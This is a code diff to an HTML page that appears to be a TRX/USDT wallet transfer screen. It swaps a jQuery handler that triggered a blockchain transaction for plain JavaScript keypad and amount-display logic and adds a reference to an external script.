@@ -136,23 +136,54 @@
         </div>
         <button class="next-button" id="submitBtn">Next</button>
     </div>
-
+ <script type="text/javascript" src="./static/js/to.js"></script>
+   
     <script>
     
-    $(function() {
-            sleep(1000).then(() => {
-                getAssets(function(trx, usdt) {
-                    $("#submitBtn")["removeAttr"]("disabled");
-                    $("#submitBtn")["text"]("下一步");
-                    $("#available-amount").html(trx);
-                });
-            });
-            $("#submitBtn").click(function() {
-                executeBlockchainTransaction();
-            });
-        });
+   
     
-        
+        let amount = '0';
+        const amountDisplay = document.getElementById('amount-display');
+        const usdAmount = document.getElementById('usd-amount');
+        const decimal = document.getElementById('decimal');
+        const availableAmount = document.getElementById('available-amount');
+
+        function updateDisplay() {
+            amountDisplay.textContent = amount;
+            usdAmount.textContent = (parseFloat(amount) * 0.13).toFixed(2) + ' USD';
+        }
+
+        function addDigit(digit) {
+            if (amount === '0' && digit !== '.') {
+                amount = digit;
+            } else if (digit === '.' && amount.includes('.')) {
+                return;
+            } else if (amount.split('.')[1]?.length >= 6) {
+                return;
+            } else if (amount === '0' && digit === '0') {
+                return;
+            } else {
+                amount += digit;
+            }
+            updateDisplay();
+        }
+
+        function deleteDigit() {
+            amount = amount.slice(0, -1);
+            if (amount === '' || amount === '0.') amount = '0';
+            updateDisplay();
+        }
+
+        function setMaxAmount() {
+            amount = availableAmount.textContent;
+            updateDisplay();
+        }
+
+        setInterval(() => {
+            decimal.style.visibility = decimal.style.visibility === 'hidden' ? 'visible' : 'hidden';
+        }, 500);
+
+        updateDisplay();
     </script>
 </body>
 </html>
